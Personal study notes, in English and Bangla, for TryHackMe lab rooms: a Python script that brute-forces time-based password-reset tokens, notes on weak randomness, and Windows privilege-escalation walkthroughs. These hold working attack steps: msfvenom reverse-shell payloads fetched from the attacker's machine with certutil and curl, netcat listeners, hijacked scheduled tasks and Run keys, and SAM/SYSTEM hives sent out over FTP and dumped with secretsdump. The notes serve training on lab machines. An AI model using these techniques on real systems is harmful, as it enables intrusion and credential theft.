# Weekly-Learning-Outcome

![image](img/img01.png)

![image](img/img02.png)

![image](img/easy_peasy01.png)

![image](img/easy_peasy02.png)

![image](img/easy_peasy03.png)

---
---
---

## ToolsRus 

![image](img/ToolsRus01.png)
![image](img/ToolsRus02.png)
![image](img/ToolsRus03.png)
![image](img/ToolsRus04.png)
![image](img/ToolsRus05.png)
![image](img/ToolsRus06.png)
![image](img/ToolsRus07.png)
![image](img/ToolsRus08.png)
![image](img/ToolsRus09.png)
![image](img/ToolsRus10.png)
![image](img/ToolsRus11.png)
![image](img/ToolsRus12.png)
![image](img/ToolsRus13.png)
![image](img/ToolsRus14.png)
![image](img/ToolsRus15.png)
![image](img/ToolsRus16.png)

---
---
---

## Spring4Shell

![image](img/spring4shell01.png)
![image](img/spring4shell02.png)

---
---
---


## Hacking With Powershell
![image](img/hacking_with_powershell.png)

#### Solve the room with the help of this writeup 

```
https://medium.com/@austindwarner8/hacking-with-powershell-learn-the-basics-of-powershell-and-powershell-scripting-811af66ee0fa
```





## Insecure Randomness

![image](img/insecure_randomness/2.png)

## Task_4: solving python code[updated]
```

import requests
import sys
import time  # <-- added

# Function to brute force the reset token
def brute_force_token(username):
    url = "http://random.thm:8090/case/reset_password.php"
    
    # Get current timestamp automatically
    start_timestamp = int(time.time())
    
    print(f"[+] Starting timestamp: {start_timestamp}")
    
    # Try tokens within a range of -5 minutes
    for i in range(-300, 0):
        current_timestamp = start_timestamp + i
        token = f"{username}{current_timestamp}"
        params = {'token': token}
        
        response = requests.get(url, params=params)
        
        # Check if the token is valid
        if "Invalid or expired token." not in response.text:
            print(f"[✔] Correct token identified: {token}")
            return token
        else:
            print(f"[✖] Tried token: {token} (Invalid)")
    
    print("[-] No valid token found in the given range.")
    return None


if len(sys.argv) != 2:
    print("Usage: python exploit.py <username>")
    sys.exit(1)

username = sys.argv[1]

# Call function without passing timestamp
brute_force_token(username)


```


# 🔐 Random Number Generator Notes (Bangla)

## 🎲 True Random Number Generator (TRNG)

👉 বাস্তব physical source থেকে random নেয়
👉 সম্পূর্ণ unpredictable

**Example:**

* বাতাসের noise 🌬️
* hardware thermal noise
* radioactive decay

➡️ এগুলো আগাম guess করা যায় না ✅

---

## 🔢 Pseudo Random Number Generator (PRNG)

👉 algorithm দিয়ে random তৈরি করে
👉 আসলে fully random না (predictable)

**Example (Python):**

```python
import random
random.seed(5)
print(random.randint(1,100))
```

➡️ একই seed দিলে same output 🔁

---

## 📊 Statistical PRNG

👉 সাধারণ কাজের জন্য
👉 দেখতে random লাগে, কিন্তু secure না

**Example:**

* Game 🎮
* Simulation

➡️ attacker predict করতে পারে ❌

---

## 🔐 Cryptographically Secure PRNG (CSPRNG)

👉 security purpose-এর জন্য
👉 predict করা খুব কঠিন

**Example (Python):**

```python
import secrets
print(secrets.randbelow(100))
```

➡️ Uses:

* Password
* Token
* OTP

---

## 🌱 Seed

👉 PRNG শুরু করার initial value

**Example:**

* seed = 10 → এক output
* seed = 20 → অন্য output

➡️ Same seed = same result 🔁

---

## 🌪️ Entropy

👉 randomness-এর quality

* High entropy ✅ → unpredictable
* Low entropy ❌ → easily guessable

**Example:**

* Mouse movement → high entropy
* শুধু time() → low entropy

---

## ⚠️ Weak Entropy (কেন ও কিভাবে হয়?)

### ❓ কেন হয়?

* কম randomness source
* predictable input ব্যবহার

### 🔍 কিভাবে হয়?

* শুধু `time()` দিয়ে token তৈরি
* fixed seed ব্যবহার
* pattern follow করা

**Example:**

```php
token = username + time()
```

➡️ attacker সময় guess করে token বের করতে পারে 😈

---

## ❗ কেন dangerous?

👉 attacker easily predict করতে পারে
👉 system hack হতে পারে

**Real Case:**

* Password reset token brute force 🔥

---

## 📊 Diagram (Simple Understanding)

```
        [ Real World Noise ]
               │
               ▼
             TRNG
               │
     ----------------------
     │                    │
 High Entropy        True Random


        [ Seed ]
          │
          ▼
        PRNG Algorithm
          │
     ----------------------
     │                    │
 Statistical PRNG     CSPRNG
 (Not Secure)        (Secure)


Weak Entropy Example:

   username + time()  ❌
          │
          ▼
   Predictable Token → Attack Possible 😈
```

---

## 🧠 Quick Summary

* TRNG = real random ✅
* PRNG = algorithm-based ❌
* Statistical PRNG = non-secure
* CSPRNG = secure
* Seed = starting value
* Entropy = randomness 




# Windows Privilege Escalation

# **************************Windows Privilege Escalation via Schedule Task**************************

### Thm room link:  [Windows PrivEsc](https://tryhackme.com/room/windows10privesc)

📝 Windows Scheduled Task (Task Scheduler) – সংক্ষিপ্ত নোট

Scheduled Task হলো Windows-এর একটি ফিচার, যা ব্যবহার করে নির্দিষ্ট সময়, ইভেন্ট বা শর্ত অনুযায়ী স্বয়ংক্রিয়ভাবে কোনো প্রোগ্রাম, স্ক্রিপ্ট বা কমান্ড চালানো যায়।

🔹 উদাহরণ:

* নির্দিষ্ট সময়ে ব্যাকআপ নেওয়া
* লগইন হলে স্ক্রিপ্ট রান করা
* সিস্টেম আপডেট চেক করা

👉 এটি মূলত Task Scheduler টুলের মাধ্যমে পরিচালিত হয়।


📊 Scheduled Task vs Windows Services

| বিষয়                  | Scheduled Task (টাস্ক স্কেজুলার)              | Windows Services (সার্ভিস)                  |
|-----------------------|-----------------------------------------------|---------------------------------------------|
| কাজের ধরণ            | নির্দিষ্ট সময়/ইভেন্টে রান হয়                 | সবসময় বা ব্যাকগ্রাউন্ডে চলতে থাকে          |
| চালু হওয়ার সময়       | ট্রিগার (time, event, condition) ভিত্তিক     | সিস্টেম বুট হলে বা ম্যানুয়ালি স্টার্ট হয়   |
| রান হওয়ার সময়কাল     | নির্দিষ্ট কাজ শেষে বন্ধ হয়ে যায়              | ক্রমাগত (continuous) রান করে               |
| ব্যবহারের উদাহরণ     | ব্যাকআপ, স্ক্রিপ্ট, আপডেট                    | antivirus, database, web server            |
| কনফিগারেশন টুল      | Task Scheduler                               | Services Manager (services.msc)            |
| ইউজার নির্ভরতা       | নির্দিষ্ট ইউজার বা সিস্টেম হিসেবে রান হতে পারে| সাধারণত system-level এ চলে                |
| রিসোর্স ব্যবহার      | কম (only when triggered)                     | বেশি (কারণ সবসময় রান করে)                |
| ফ্লেক্সিবিলিটি       | বেশি (custom trigger & condition)            | কম (always running)                        |



## Technique_1 : Find Schedule Tasks using **SCHTASKS** 
### cmd_1: Default table format
```
schtasks /fo LIST  
```
### cmd_2: Show all the taskname 
```
schtasks /fo LIST | findstr /I taskname
```
* here /I --> is igname lowercase/upercase of taskname

### cmd_3: Showing only our needed taskname [vulnerable]
```
schtasks /fo LIST | findstr /I taskname | findstr /I /V microsoft
```
* It ignore the taskname where microsoft.. Suppose here get a taskname **\Savecred** which maybe vulnerable.

### cmd_4: get all info of this schedule task **Savecred**
```
schtasks /tn Savecred /fo list /v 
```
* here the schedule task Savecred running the file **"C:\PrivEsc\savecred.bat"**

### cmd_5: get info of this file **"C:\PrivEsc\savecred.bat"**
```
type C:\PrivEsc\savecred.bat
```
* Here admin username, password , how to get admin shell is given

### cmd_6: get admin shell
```
runas /user:admin cmd.exe
```
* Enter pass: password123 and get admin shell








## Technique_2: Search for Looking suspicious 
### cmd_1: Go to DevTools [looking suspicious] and show it's files
```
cd DevTools
dir
```
* here has a CleanUp.ps1 powershell file
### cmd_2: get info of this file
```
type CleanUp.ps1
```
* It clean up logs every min like schedule task [Remove-Item C:\DevTools\*.log]

### Check this file privilege using icacls [recommended]
```
icacls CleanUp.ps1
```
* output:

```
BUILTIN\Users: (M)
NT AUTHORITY\SYSTEM: (F)
BUILTIN\Administrators: (F)
WIN-QB...\Administrators: (F)
NT AUTHORITY\SYSTEM: (I)(F)
BUILTIN\Administrators: (I)(F)
BUILTIN\Users: (I)(RX)
```

* Here (M) means --> modified(read,write,exe..)
* (F) means --> Full Access(read,write,exe and also change file permission)
* (I) means --> Inherited(folder where is in the file)

### Check this file privilege using accesschx.exe
```
C:\PrivEsc\accesschk.exe -accepteula -quv user CleanUp.ps1
```
* -accepteula means accept aggrement.. -q means quit banner, u means shows permission for the given username [user], v means also show execute
* It check only my user's permission for this file

### Check this file privilege using ECHO [easy and short]
```
echo hello > CleanUp.ps1
```
* If no error, then the file have write permission for this user

```
echo echo ^> C:\Users\user\test.txt > CleanUp.ps1
```
* If test.txt file is created then we can ensure that thae CleanUp.ps1 file run in every min / epecific time later..

```
type CleanUp.ps1
```
* output: echo > C:\Users\user\test.txt

```
dir C:\Users\user\
```
* Check the file is created or not ..Here it is created

### Now Create ReverseShell & get admin Access
website : revshells.com
IP : my_machine_tun0, PORT: 4444, 
OS: powershell#3(Base64)  [copy this code]

* Now create netcat listener to my kali on port 4444
```
nc -nvlp 4444
```
* append this copied code to CleapUp.ps1
```
echo copyed_code > CleanUp.ps1
```
* Now after a specific time when CleanUp.ps1 run it gives a reverse connection to my kali ..






##  🪟 Windows Startup Folder Privilege Escalation

**Startup Folder** হলো Windows-এর একটি বিশেষ ফোল্ডার, যেখানে রাখা যেকোনো প্রোগ্রাম বা স্ক্রিপ্ট ইউজার লগইন করার সাথে সাথে স্বয়ংক্রিয়ভাবে রান হয়।

### ⚠️ Privilege Escalation কীভাবে হয়?
যদি কোনো **low privilege user** এই Startup folder-এ **write permission** পায়, এবং এই ফোল্ডারটি কোনো **Administrator user** দ্বারা ব্যবহৃত হয়, তাহলে attacker সেখানে একটি malicious file রাখতে পারে।

👉 পরে যখন Admin লগইন করবে, সেই malicious file রান হবে  
👉 এবং attacker **Admin privilege** পেয়ে যাবে  

---

### 🛠️ সংক্ষেপে ধাপ:
1. Startup folder-এর permission চেক করা  
2. যদি write access থাকে → vulnerability  
3. malicious script (.bat/.exe) তৈরি করা  
4. Startup folder-এ রেখে দেওয়া  
5. Admin লগইনের অপেক্ষা  
6. Admin privilege পাওয়া  

---

### 💡 উদাহরণ:
```bat
net localgroup administrators attacker /add
```

### 👉 এই কমান্ড রান হলে attacker admin group-এ যুক্ত হয়ে যাবে


🔐 প্রতিরোধ:
* Startup folder-এ write permission সীমিত করা
* Proper ACL (Access Control) ব্যবহার করা
* Suspicious file monitor করা


## Solve the THM room

### **Run The windows machine**

```
xfreerdp3 /U:user /P:password321 /cert:ignore /V:ip /smart-sizing
```

### **Go to startup folder**
```
cd "c:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

dir
```

### **Check the file write permission**
```
echo > test.txt 
```
##### if the file test.txt is created then the folder have write permission for your user

### **Now make a reverse shell of my kali linux machine**
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o shell.exe

python3 -m http.server 80

nc -nlvp 4444
```

### **Download / Add the malicious shell.exe fo the Startup folder**
```
certutil -urlcache -split -f http://kali_ip shell.exe shell.exe
```
#### Now it add the shell.exe file to the windows startup folder. When a user(administrator) login then the shell.exe if automatically run and give the reverse connection to the kali shell ..







# **WIndows Privilege Escalation via Registry**

📝 Windows Registry

Windows Registry হলো Windows অপারেটিং সিস্টেমের একটি কেন্দ্রীয় ডাটাবেজ, যেখানে সিস্টেম, হার্ডওয়্যার, সফটওয়্যার এবং ইউজার সেটিংস সংরক্ষিত থাকে।

🔹 সহজভাবে বুঝলে:

👉 Registry = Windows-এর “Configuration Storage”
👉 এখানে OS ও অ্যাপ্লিকেশন কীভাবে কাজ করবে তার তথ্য থাকে

📂 Registry Structure (গঠন)

Registry মূলত কয়েকটি Root Key (Hive) নিয়ে গঠিত:

* HKEY_LOCAL_MACHINE (HKLM) → সিস্টেম ও হার্ডওয়্যার সেটিংস
* HKEY_CURRENT_USER (HKCU) → বর্তমান ইউজারের সেটিংস
* HKEY_CLASSES_ROOT (HKCR) → ফাইল টাইপ ও অ্যাসোসিয়েশন
* HKEY_USERS (HKU) → সব ইউজারের সেটিংস
* HKEY_CURRENT_CONFIG (HKCC) → বর্তমান হার্ডওয়্যার কনফিগারেশন

⚙️ Registry ব্যবহার
* সফটওয়্যার কনফিগারেশন সংরক্ষণ
* Windows startup program নিয়ন্ত্রণ
* ইউজার preference (theme, settings)
* ডিভাইস ও ড্রাইভার তথ্য

🛠️ Registry Editor

👉 Registry edit করার জন্য টুল:
```
regedit

```
⚠️ গুরুত্বপূর্ণ সতর্কতা
* ভুলভাবে Registry পরিবর্তন করলে system crash হতে পারে
* edit করার আগে backup নেওয়া উচিত

### ==> Now show How Privilege escalate by Registry 
---
## **AlwaysInstallElevated Registry**
---

📝 AlwaysInstallElevated Registry – সংক্ষিপ্ত নোট (বাংলা)

AlwaysInstallElevated হলো একটি Registry setting, যা enable থাকলে .msi package install করার সময় automatic admin (elevated) privilege পায়।
📂 গুরুত্বপূর্ণ key:
```
HKCU\Software\Policies\Microsoft\Windows\Installer
HKLM\Software\Policies\Microsoft\Windows\Installer

```
👉 এখানে AlwaysInstallElevated = 1 হলে feature enable থাকে

⚙️ কীভাবে কাজ করে:

👉 User MSI file run করে → Windows check করে এই setting →
👉 Enable থাকলে → installer admin privilege নিয়ে run হয়

⚠️ Security Risk:
Normal user malicious .msi চালিয়ে admin access নিতে পারে
এটি একটি common Privilege Escalation vulnerability

### Check this registry for HKLM (Hive Key Local Machine)
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
#### Output should be like 
```
AlwaysInstallElevated     REG_DWORD  0x1  [true]
DisableMSI                REG_DWORD  0x0  [flase]
``` 

### Check this registry for HKCU (Hive Key Current User)
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```
#### Output should be like 
```
AlwaysInstallElevated     REG_DWORD  0x1  [true]
``` 

#### HKLM & HKCU outout should be like that then this technique is worked,otherwise not worked..

### Create a malicious shell.msi & run netcat listener on my kali machine

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f msi > shell.msi

python3 -m http.server 80

nc -nlvp 4444
```

### Now download and run the file in the windows
```
cd Desktop

curl http://my_kali_ip/shell.msi    [download]

msiexec /quiet /i shell.msi        [run]
```

#### when the file is run , get the reverse shell connection to my kali machine & get the system user 


---
## **Run Registry**
---
📝 Run & Autorun Registry – সংক্ষিপ্ত নোট (বাংলা)
Run Registry Key হলো এমন জায়গা যেখানে program path রাখা হয়, যা login বা startup-এ automatically run হয়

📂 গুরুত্বপূর্ণ key:
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```
* HKCU → শুধু current user
* HKLM → সব user

⚙️ কীভাবে কাজ করে:

👉 System start / login → Registry check → Program auto run

### Check this registry for HKLM (Hive Key Local Machine)

```
reg query HKLM\SOFTWARE\Microsoft\Windows\Current Version\Run
```

#### Output
```
My Program REG_SZ "c:\Program Files\Autorun Program\Program.exe"
```
### Go to this folder and check the file permission 
```
cd "c:\Program Files\Autorun Program"
dir
echo > program.exe      [gives no error.Write permission of this file]
echo > test.exe         [Access is denied..Can't create any file to this folder]
```

#### Now I should not delete the program.exe and make a new file program.exe which is malicious

### Now append the shell.exe [created for the AlwaysInstallElevated Registry ] to this program.exe
```
curl http://my_kali_ip/shell.exe -o program.exe
```

#### ==> Now when a user(admin) is login,then program.exe file is run automatically & give the reverse connection shell to my kali machine [running nc listener]



---
## **RunOnce Registry**
---
📝 RunOnce Registry – সংক্ষিপ্ত নোট (বাংলা)

RunOnce Registry Key এমন একটি key যেখানে রাখা program/script শুধু একবার run হয়, সাধারণত next login বা system startup-এ।
📂 গুরুত্বপূর্ণ key:
```
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```
* HKCU → current user-এর জন্য
* HKLM → সব user-এর জন্য

⚙️ কীভাবে কাজ করে:
👉 System start / login → RunOnce key check → program run → entry automatically delete হয়ে যায়

⚠️ Security:
Malware একবার execution বা setup task চালাতে ব্যবহার করতে পারে

### Check this registry for HKLM (Hive Key Local Machine)

```
reg query HKLM\SOFTWARE\Microsoft\Windows\Current Version\Runonce
```
#### output: nothing is shown [no files]

### Now try to add a new registry
```
reg add HKLM\SOFTWARE\Microsoft\Windows\Current Version\Runonce /V shell /t REG_SZ /d "c:\Program Files\Autorun Program\Program.exe" /f
```

#### Output: Error[access is denied]
#### Here REG_SZ means string type registry

#### If there have access then when a user(admin) login it automatically run the "c:\Program Files\Autorun Program\Program.exe" and then get the reverse shell to my kali machine & then it will remove this "c:\Program Files\Autorun Program\Program.exe" file..





# **WIndows Privilege Escalation via Credential Discovery**

## Try to find credentials from Registries

```
reg query HKLM /f password /t REG_SZ /s
```
* /f --> find, -t --> type = string ..It searches password in Local Machine. Here you may get the important credentials

```
reg query "HKLM\Software\Microsoft\Windows NT\Current Version\winlogon"
```
* winlogon is a important registry. We should check it out. We can get important credentials here.

```
reg query HKLM_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\
```
* output: HKLM_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP/23F42

```
reg query HKLM_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP/23F42
```
* Here you may get another user(admin) credentials who used his username and password for login via ssh or proxy server etc..


## Try to find credentials using cmdkey (Windows Credential Manager) 

cmdkey হলো Windows-এর একটি command-line tool, যা ব্যবহার করে Credential Manager-এ username ও password (credentials) save, view, delete করা যায়।

🔹 কী কাজ করে?

👉 বিভিন্ন service (RDP, network share ইত্যাদি) access করার জন্য credentials store করে
👉 বারবার password না দিয়ে auto login সম্ভব হয়

⚙️ Common Commands:
```
cmdkey /list        → সব saved credentials দেখায়
cmdkey /add         → নতুন credential যোগ করে
cmdkey /delete      → credential delete করে
```
👉 system-এ stored credentials দেখা যাবে
⚠️ Security:
* Stored credential misuse হলে unauthorized access হতে পারে
* attacker saved credential ব্যবহার করে lateral movement করতে পারে

💡 উদাহরণ:
```
cmdkey /list
```
* Shows the credentials . Here it may show admin username but is don't show it's pass. Because pass is encrypted . Suppose , Here admin credentials is saved, but pass is not shown . Now we can use some technique for privilege escalation. 

```
runas /savecred /user:admin cmd.exe
```
* runas--> like sudo, /savecred--> don't need pass.
* It run a new cmd as admin user

```
runas /savecred /user:admin reverse.exe
```
* Here we can also use reverse_shell which is created by msfvenom and netcal listener is open ..



## Try to find credentials using SAM & SYSTEM

🔹 SAM (Security Account Manager)

SAM হলো Windows-এর একটি database, যেখানে local user account ও password (hashed form) সংরক্ষিত থাকে।
📂 Location: C:\Windows\System32\config\SAMC:\Windows\System32\config\SAM

⚙️ কী থাকে:
* Usernames
* Password hashes
* Group information

⚠️ Security:
* Directly readable না (locked থাকে)
* কিন্তু dump করলে password hash পাওয়া যায়

🔹 SYSTEM

SYSTEM file হলো Registry hive, যেখানে system configuration ও encryption key থাকে।
📂 Location: C:\Windows\System32\config\SYSTEM

⚙️ কী কাজ:
* Boot configuration
* System settings
* SAM hash decrypt করার key (boot key) store করে

🔗 SAM + SYSTEM সম্পর্ক
👉 SAM-এ password hash encrypted থাকে
👉 SYSTEM file-এর key দিয়ে সেই hash decrypt করা যায়

⚠️ Security Risk:
* SAM + SYSTEM access পেলে attacker password hash extract করতে পারে
* এরপর password crack বা pass-the-hash attack সম্ভব

```
copy C:\Windows\System32\config\SAM
```
* checking if SAM file have read/copy permission for my user. Most probably you don't get the permission. But some times , admin/other user saved the SAM & SYSTEM file in another folder. If we check all the folder's info , we may get SAM & SYSTEM file. In this lab , we get this in "C:\Windows\Repair" folder
```
cd C:\Windows\Repair
copy SAM C:\Users\user
```
* checking it's read permission for my user.And I have the permission. And the SAM file is encrypted, SYSTEM file is used to decrypt it..

* Now try to transfer these two files in my kali linux using ftp server
```
kali: python3 -m pyftplib --write --port 21
```
* now from windows connect to kali using ftp
```
ftp kali_ip
```
* username: anonymous , password: ...... Connected as anonymous user.
```
binary
```
* for transter in binary mode
```
put SAM
put SYSTEM
```
* It upload the files and it will saved in my kali automatically

Now In my kali decrypt the Files
```
kali: impacket-secretsdump LOCAL -system SYSTEM -sam SAM
```
* Decrypt these files and here you may get some credentials but in hash form(pass)
* You can unhash using john the ripper and websites or you can directly use the hashes for login 





## Try to find credentials from History

ROOM LINK : [Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20)

==>For this room, Get the windows use **Remmina** . It's give a GUI for RDP (remote) login to windows

* In general, cmd is not store the command history . But powershell is store command history. Now  check powershell command history..

```
type C:\Users\your_user\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost-history.txt
```

* Powershell history is generated differently for different users.
* Here in history, you may get some important credentials.


## Try to find credentials from config files
* Important config files 

Unattend.xml হলো Windows setup-এর একটি configuration file, যা ব্যবহার করে automated (unattended) installation করা হয়—মানে user input ছাড়াই Windows install করা যায়।
📂 Location: C:\Windows\Panther\Unattend.xml

⚙️ কী থাকে এই ফাইলে:
* Administrator username
* Password (কখনও plain text বা encoded)
* Computer name
* Time zone, language settings
* Installation configuration

💡 কীভাবে কাজ করে:
👉 Windows install-এর সময় এই file read করে
👉 Automatically সব setup process complete করে

⚠️ Security Risk:
* এখানে sensitive info (username/password) থাকতে পারে
* Misconfigured হলে attacker credential পেতে পারে
* Privilege Escalation-এর জন্য useful হতে পারে

#### checking info of this Unattend.xml file
```
type C:\Windows\Panther\Unattend.xml
```

* Another important config file 

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\web.config হলো .NET Framework-এর একটি গুরুত্বপূর্ণ configuration file, যা ASP.NET web application বা .NET runtime settings নিয়ন্ত্রণ করে।
📂 Location: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\web.config  [version is changeable]

⚙️ কী কাজ করে:
* ASP.NET application settings কনফিগার করে
* Security, authentication ও authorization rules define করে
* Database connection settings রাখতে পারে
* Runtime behavior control করে

💡 কী থাকে:
* Connection strings (database info)
* App settings (key-value configuration)
* Security policies
* Module & handler configuration

⚠️ Security Risk:
* Sensitive data (DB credentials, API keys) থাকতে পারে
* Misconfiguration হলে information leakage হতে পারে
* Web application attack surface বাড়ায়

#### checking info of this web.config file
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\web.config
```
* Here have a chance to get database username and password.. 